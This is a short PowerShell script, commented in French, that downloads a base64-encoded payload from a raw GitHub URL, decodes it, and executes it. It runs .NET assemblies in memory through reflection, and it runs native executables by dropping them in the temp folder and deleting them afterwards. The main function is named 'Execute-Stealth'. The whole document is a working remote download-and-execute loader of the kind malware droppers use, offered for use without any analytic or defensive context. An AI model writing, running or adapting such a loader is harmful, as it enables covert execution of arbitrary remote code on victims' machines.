[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    # Tenter de charger comme assembly .NET (pour exe C#)
    try {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {
            $entryPoint.Invoke($null, @())
            return
        }
    } catch {
        # Ce n'est pas un exe .NET, c'est probablement un exe natif (C++)
    }

    # Pour exe natif (C++), sauvegarder temporairement et exécuter
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "temp_" + [System.Guid]::NewGuid().ToString() + ".exe")
    $process = $null
    try {
        [System.IO.File]::WriteAllBytes($tempPath, $bytes)
        $process = Start-Process -FilePath $tempPath -NoNewWindow -PassThru
        
        # S'assurer que le process se ferme quand PowerShell se ferme (comme le pote)
        $processId = $process.Id
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
            try {
                $proc = Get-Process -Id $using:processId -ErrorAction SilentlyContinue
                if ($proc) {
                    Stop-Process -Id $using:processId -Force -ErrorAction SilentlyContinue
                }
            } catch { }
        } | Out-Null
        
        $process.WaitForExit()
    } finally {
        # S'assurer que le process est fermé
        if ($process -and -not $process.HasExited) {
            try {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            } catch { }
        }
        # Nettoyer le fichier temporaire
        if (Test-Path $tempPath) {
            Start-Sleep -Milliseconds 100
            Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
        }
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/main/file.txt"

Execute-Stealth -url $url
